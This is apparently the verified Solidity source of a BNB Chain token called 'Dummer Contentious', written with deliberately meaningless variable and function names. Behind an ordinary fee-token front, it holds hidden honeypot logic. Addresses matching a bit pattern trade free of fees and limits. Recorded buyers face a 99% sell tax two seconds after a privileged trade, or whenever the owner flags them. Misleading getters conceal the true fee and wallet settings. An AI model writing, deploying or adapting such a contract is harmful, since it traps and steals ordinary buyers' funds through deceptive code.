/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DummerContentious is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Dummer Contentious ";
    string constant _symbol = "DummerContentious";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedMinBurnMarketing;
    mapping(address => bool) private burnSellBotsModeLiquidity;
    mapping(address => bool) private burnAutoTradingLiquidityIsMin;
    mapping(address => bool) private minModeTeamMarketingAuto;
    mapping(address => uint256) private marketingBuyAutoReceiver;
    mapping(uint256 => address) private tradingBotsReceiverMarketingTeamMinMode;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private botsExemptTradingBurnFeeMode = 0;
    uint256 private modeFeeLiquidityBuy = 8;

    //SELL FEES
    uint256 private isLaunchedFeeTx = 0;
    uint256 private launchedSellBuyWallet = 8;

    uint256 private swapMinWalletBuyMarketingTrading = modeFeeLiquidityBuy + botsExemptTradingBurnFeeMode;
    uint256 private receiverExemptSellWallet = 100;

    address private autoModeLiquidityFee = (msg.sender); // auto-liq address
    address private burnBotsReceiverWallet = (0x2A5C7f0DAF90FCcf8d7ca1dBFfFfFE19bd873a53); // marketing address
    address private maxIsModeExemptSwapLiquidity = DEAD;
    address private minIsReceiverBurn = DEAD;
    address private tradingExemptWalletSwap = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private tradingMinLaunchedAuto;
    uint256 private tradingMinSwapSell;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private exemptLaunchedTeamBurnLimitMarketing;
    uint256 private maxBuyFeeTrading;
    uint256 private walletIsSellMode;
    uint256 private feeMarketingMaxBuyTeam;
    uint256 private teamLiquidityMaxReceiver;

    bool private buyMinSellLiquidity = true;
    bool private minModeTeamMarketingAutoMode = true;
    bool private isSwapLiquiditySellMarketing = true;
    bool private liquidityBurnMaxMode = true;
    bool private feeBurnIsSwapAutoTx = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private minIsFeeLaunched = 6 * 10 ** 15;
    uint256 private exemptMinBurnTxAutoTeamIs = _totalSupply / 1000; // 0.1%

    
    uint256 private limitReceiverTxMarketing = 0;
    bool private feeLaunchedSellIsLiquidityTradingMarketing = false;
    uint256 private isMinSwapMode = 0;
    uint256 private swapTradingBurnBots = 0;
    bool private exemptMarketingWalletBuyLiquidityBurn = false;
    bool private exemptWalletLimitAuto = false;
    uint256 private receiverBuyAutoTeam = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        exemptLaunchedTeamBurnLimitMarketing = true;

        launchedMinBurnMarketing[msg.sender] = true;
        launchedMinBurnMarketing[address(this)] = true;

        burnSellBotsModeLiquidity[msg.sender] = true;
        burnSellBotsModeLiquidity[0x0000000000000000000000000000000000000000] = true;
        burnSellBotsModeLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        burnSellBotsModeLiquidity[address(this)] = true;

        burnAutoTradingLiquidityIsMin[msg.sender] = true;
        burnAutoTradingLiquidityIsMin[0x0000000000000000000000000000000000000000] = true;
        burnAutoTradingLiquidityIsMin[0x000000000000000000000000000000000000dEaD] = true;
        burnAutoTradingLiquidityIsMin[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptSellModeTeamMaxTx(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return exemptSellModeTeamMaxTx(sender, recipient, amount);
    }

    function exemptSellModeTeamMaxTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (receiverBuyAutoTeam != swapTradingBurnBots) {
            receiverBuyAutoTeam = isMinSwapMode;
        }


        bool bLimitTxWalletValue = liquidityLaunchedAutoBotsTx(sender) || liquidityLaunchedAutoBotsTx(recipient);
        
        if (feeLaunchedSellIsLiquidityTradingMarketing != exemptMarketingWalletBuyLiquidityBurn) {
            feeLaunchedSellIsLiquidityTradingMarketing = minModeTeamMarketingAutoMode;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                minTeamBuyExemptModeMax();
            }
            if (!bLimitTxWalletValue) {
                feeLiquidityWalletMinSellReceiverTrading(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return minFeeModeExemptSwapSell(sender, recipient, amount);}

        if (!launchedMinBurnMarketing[sender] && !launchedMinBurnMarketing[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || burnAutoTradingLiquidityIsMin[sender] || burnAutoTradingLiquidityIsMin[recipient], "Max TX Limit has been triggered");

        if (sellMaxTxFeeLimitMin()) {receiverTradingTxLiquidityTeamBotsWallet();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = txSwapMinTrading(sender) ? sellFeeTxTrading(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function minFeeModeExemptSwapSell(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txSwapMinTrading(address sender) internal view returns (bool) {
        return !burnSellBotsModeLiquidity[sender];
    }

    function autoMinBurnSwap(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            swapMinWalletBuyMarketingTrading = launchedSellBuyWallet + isLaunchedFeeTx;
            return walletBurnModeLiquidityBuyAuto(sender, swapMinWalletBuyMarketingTrading);
        }
        if (!selling && sender == uniswapV2Pair) {
            swapMinWalletBuyMarketingTrading = modeFeeLiquidityBuy + botsExemptTradingBurnFeeMode;
            return swapMinWalletBuyMarketingTrading;
        }
        return walletBurnModeLiquidityBuyAuto(sender, swapMinWalletBuyMarketingTrading);
    }

    function maxIsSwapReceiver() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function sellFeeTxTrading(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (isMinSwapMode != launchedSellBuyWallet) {
            isMinSwapMode = isLaunchedFeeTx;
        }

        if (swapTradingBurnBots == isMinSwapMode) {
            swapTradingBurnBots = isMinSwapMode;
        }

        if (exemptWalletLimitAuto != feeLaunchedSellIsLiquidityTradingMarketing) {
            exemptWalletLimitAuto = minModeTeamMarketingAutoMode;
        }


        uint256 feeAmount = amount.mul(autoMinBurnSwap(sender, receiver == uniswapV2Pair)).div(receiverExemptSellWallet);

        if (minModeTeamMarketingAuto[sender] || minModeTeamMarketingAuto[receiver]) {
            feeAmount = amount.mul(99).div(receiverExemptSellWallet);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function liquidityLaunchedAutoBotsTx(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function walletBurnModeLiquidityBuyAuto(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = marketingBuyAutoReceiver[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function feeLiquidityWalletMinSellReceiverTrading(address addr) private {
        if (maxIsSwapReceiver() < minIsFeeLaunched) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        tradingBotsReceiverMarketingTeamMinMode[exemptLimitValue] = addr;
    }

    function minTeamBuyExemptModeMax() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (marketingBuyAutoReceiver[tradingBotsReceiverMarketingTeamMinMode[i]] == 0) {
                    marketingBuyAutoReceiver[tradingBotsReceiverMarketingTeamMinMode[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(burnBotsReceiverWallet).transfer(amountBNB * amountPercentage / 100);
    }

    function sellMaxTxFeeLimitMin() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    feeBurnIsSwapAutoTx &&
    _balances[address(this)] >= exemptMinBurnTxAutoTeamIs;
    }

    function receiverTradingTxLiquidityTeamBotsWallet() internal swapping {
        
        if (exemptWalletLimitAuto != feeBurnIsSwapAutoTx) {
            exemptWalletLimitAuto = exemptWalletLimitAuto;
        }

        if (exemptMarketingWalletBuyLiquidityBurn == minModeTeamMarketingAutoMode) {
            exemptMarketingWalletBuyLiquidityBurn = isSwapLiquiditySellMarketing;
        }

        if (limitReceiverTxMarketing != exemptMinBurnTxAutoTeamIs) {
            limitReceiverTxMarketing = modeFeeLiquidityBuy;
        }


        uint256 amountToLiquify = exemptMinBurnTxAutoTeamIs.mul(botsExemptTradingBurnFeeMode).div(swapMinWalletBuyMarketingTrading).div(2);
        uint256 amountToSwap = exemptMinBurnTxAutoTeamIs.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = swapMinWalletBuyMarketingTrading.sub(botsExemptTradingBurnFeeMode.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(botsExemptTradingBurnFeeMode).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(modeFeeLiquidityBuy).div(totalETHFee);
        
        if (exemptWalletLimitAuto == isSwapLiquiditySellMarketing) {
            exemptWalletLimitAuto = buyMinSellLiquidity;
        }


        payable(burnBotsReceiverWallet).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoModeLiquidityFee,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLiquidityBurnMaxMode() public view returns (bool) {
        return liquidityBurnMaxMode;
    }
    function setLiquidityBurnMaxMode(bool a0) public onlyOwner {
        liquidityBurnMaxMode=a0;
    }

    function getLimitReceiverTxMarketing() public view returns (uint256) {
        if (limitReceiverTxMarketing != minIsFeeLaunched) {
            return minIsFeeLaunched;
        }
        if (limitReceiverTxMarketing == isLaunchedFeeTx) {
            return isLaunchedFeeTx;
        }
        if (limitReceiverTxMarketing == isLaunchedFeeTx) {
            return isLaunchedFeeTx;
        }
        return limitReceiverTxMarketing;
    }
    function setLimitReceiverTxMarketing(uint256 a0) public onlyOwner {
        if (limitReceiverTxMarketing == receiverBuyAutoTeam) {
            receiverBuyAutoTeam=a0;
        }
        if (limitReceiverTxMarketing == minIsFeeLaunched) {
            minIsFeeLaunched=a0;
        }
        if (limitReceiverTxMarketing != modeFeeLiquidityBuy) {
            modeFeeLiquidityBuy=a0;
        }
        limitReceiverTxMarketing=a0;
    }

    function getExemptMinBurnTxAutoTeamIs() public view returns (uint256) {
        if (exemptMinBurnTxAutoTeamIs == swapMinWalletBuyMarketingTrading) {
            return swapMinWalletBuyMarketingTrading;
        }
        if (exemptMinBurnTxAutoTeamIs == botsExemptTradingBurnFeeMode) {
            return botsExemptTradingBurnFeeMode;
        }
        return exemptMinBurnTxAutoTeamIs;
    }
    function setExemptMinBurnTxAutoTeamIs(uint256 a0) public onlyOwner {
        exemptMinBurnTxAutoTeamIs=a0;
    }

    function getBuyMinSellLiquidity() public view returns (bool) {
        if (buyMinSellLiquidity != feeLaunchedSellIsLiquidityTradingMarketing) {
            return feeLaunchedSellIsLiquidityTradingMarketing;
        }
        return buyMinSellLiquidity;
    }
    function setBuyMinSellLiquidity(bool a0) public onlyOwner {
        if (buyMinSellLiquidity == exemptWalletLimitAuto) {
            exemptWalletLimitAuto=a0;
        }
        if (buyMinSellLiquidity == feeLaunchedSellIsLiquidityTradingMarketing) {
            feeLaunchedSellIsLiquidityTradingMarketing=a0;
        }
        if (buyMinSellLiquidity != liquidityBurnMaxMode) {
            liquidityBurnMaxMode=a0;
        }
        buyMinSellLiquidity=a0;
    }

    function getFeeBurnIsSwapAutoTx() public view returns (bool) {
        if (feeBurnIsSwapAutoTx == buyMinSellLiquidity) {
            return buyMinSellLiquidity;
        }
        if (feeBurnIsSwapAutoTx != feeLaunchedSellIsLiquidityTradingMarketing) {
            return feeLaunchedSellIsLiquidityTradingMarketing;
        }
        return feeBurnIsSwapAutoTx;
    }
    function setFeeBurnIsSwapAutoTx(bool a0) public onlyOwner {
        if (feeBurnIsSwapAutoTx != feeBurnIsSwapAutoTx) {
            feeBurnIsSwapAutoTx=a0;
        }
        feeBurnIsSwapAutoTx=a0;
    }

    function getModeFeeLiquidityBuy() public view returns (uint256) {
        if (modeFeeLiquidityBuy == minIsFeeLaunched) {
            return minIsFeeLaunched;
        }
        if (modeFeeLiquidityBuy != minIsFeeLaunched) {
            return minIsFeeLaunched;
        }
        return modeFeeLiquidityBuy;
    }
    function setModeFeeLiquidityBuy(uint256 a0) public onlyOwner {
        if (modeFeeLiquidityBuy != swapTradingBurnBots) {
            swapTradingBurnBots=a0;
        }
        if (modeFeeLiquidityBuy == minIsFeeLaunched) {
            minIsFeeLaunched=a0;
        }
        if (modeFeeLiquidityBuy != botsExemptTradingBurnFeeMode) {
            botsExemptTradingBurnFeeMode=a0;
        }
        modeFeeLiquidityBuy=a0;
    }

    function getFeeLaunchedSellIsLiquidityTradingMarketing() public view returns (bool) {
        if (feeLaunchedSellIsLiquidityTradingMarketing == isSwapLiquiditySellMarketing) {
            return isSwapLiquiditySellMarketing;
        }
        if (feeLaunchedSellIsLiquidityTradingMarketing != feeBurnIsSwapAutoTx) {
            return feeBurnIsSwapAutoTx;
        }
        if (feeLaunchedSellIsLiquidityTradingMarketing != feeBurnIsSwapAutoTx) {
            return feeBurnIsSwapAutoTx;
        }
        return feeLaunchedSellIsLiquidityTradingMarketing;
    }
    function setFeeLaunchedSellIsLiquidityTradingMarketing(bool a0) public onlyOwner {
        if (feeLaunchedSellIsLiquidityTradingMarketing != exemptWalletLimitAuto) {
            exemptWalletLimitAuto=a0;
        }
        if (feeLaunchedSellIsLiquidityTradingMarketing == feeLaunchedSellIsLiquidityTradingMarketing) {
            feeLaunchedSellIsLiquidityTradingMarketing=a0;
        }
        if (feeLaunchedSellIsLiquidityTradingMarketing != minModeTeamMarketingAutoMode) {
            minModeTeamMarketingAutoMode=a0;
        }
        feeLaunchedSellIsLiquidityTradingMarketing=a0;
    }

    function getIsSwapLiquiditySellMarketing() public view returns (bool) {
        return isSwapLiquiditySellMarketing;
    }
    function setIsSwapLiquiditySellMarketing(bool a0) public onlyOwner {
        if (isSwapLiquiditySellMarketing == minModeTeamMarketingAutoMode) {
            minModeTeamMarketingAutoMode=a0;
        }
        isSwapLiquiditySellMarketing=a0;
    }

    function getSwapMinWalletBuyMarketingTrading() public view returns (uint256) {
        if (swapMinWalletBuyMarketingTrading != isMinSwapMode) {
            return isMinSwapMode;
        }
        if (swapMinWalletBuyMarketingTrading == launchedSellBuyWallet) {
            return launchedSellBuyWallet;
        }
        return swapMinWalletBuyMarketingTrading;
    }
    function setSwapMinWalletBuyMarketingTrading(uint256 a0) public onlyOwner {
        swapMinWalletBuyMarketingTrading=a0;
    }

    function getBurnBotsReceiverWallet() public view returns (address) {
        if (burnBotsReceiverWallet != maxIsModeExemptSwapLiquidity) {
            return maxIsModeExemptSwapLiquidity;
        }
        return burnBotsReceiverWallet;
    }
    function setBurnBotsReceiverWallet(address a0) public onlyOwner {
        if (burnBotsReceiverWallet != minIsReceiverBurn) {
            minIsReceiverBurn=a0;
        }
        if (burnBotsReceiverWallet == minIsReceiverBurn) {
            minIsReceiverBurn=a0;
        }
        if (burnBotsReceiverWallet != maxIsModeExemptSwapLiquidity) {
            maxIsModeExemptSwapLiquidity=a0;
        }
        burnBotsReceiverWallet=a0;
    }

    function getMarketingBuyAutoReceiver(address a0) public view returns (uint256) {
            return marketingBuyAutoReceiver[a0];
    }
    function setMarketingBuyAutoReceiver(address a0,uint256 a1) public onlyOwner {
        marketingBuyAutoReceiver[a0]=a1;
    }

    function getMinModeTeamMarketingAutoMode() public view returns (bool) {
        return minModeTeamMarketingAutoMode;
    }
    function setMinModeTeamMarketingAutoMode(bool a0) public onlyOwner {
        if (minModeTeamMarketingAutoMode != exemptMarketingWalletBuyLiquidityBurn) {
            exemptMarketingWalletBuyLiquidityBurn=a0;
        }
        if (minModeTeamMarketingAutoMode == feeBurnIsSwapAutoTx) {
            feeBurnIsSwapAutoTx=a0;
        }
        if (minModeTeamMarketingAutoMode != buyMinSellLiquidity) {
            buyMinSellLiquidity=a0;
        }
        minModeTeamMarketingAutoMode=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}